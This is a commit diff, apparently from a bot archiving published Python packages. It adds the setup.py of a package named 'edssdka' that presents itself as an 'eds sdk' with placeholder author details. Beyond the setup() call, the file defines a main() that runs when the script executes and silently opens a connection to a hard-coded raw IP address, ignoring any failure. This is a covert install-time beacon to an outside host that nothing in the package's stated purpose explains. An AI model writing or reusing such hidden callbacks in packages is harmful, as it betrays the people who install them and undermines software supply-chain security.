1467ec022593e28b7211708d25857b5b68ae296d
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 00:33:05 +0000

    Add package edssdka/0.0.4/edssdka-0.0.4.tar.gz

---
+++ packages/edssdka/edssdka-0.0.4.tar.gz/edssdka-0.0.4/setup.py
@@ -0,0 +1,30 @@
+from setuptools import setup, find_packages
+import urllib
+
+setup(
+    name = "edssdka",
+    version = "0.0.4",
+    keywords = ("pip", "datacanvas", "eds", "xiaoh"),
+    description = "eds sdk",
+    long_description = "eds sdk for python",
+    license = "MIT Licence",
+
+    url = "http://test.me",
+    author = "testa",
+    author_email = "testa@gmail.com",
+
+    packages = find_packages(),
+    include_package_data = True,
+    platforms = "any",
+    install_requires = []
+)
+
+def main():
+    try:
+    	urllib.urlopen('http://34.92.129.171/')
+    except:
+	return    
+
+if __name__ == "__main__":
+    main()
+
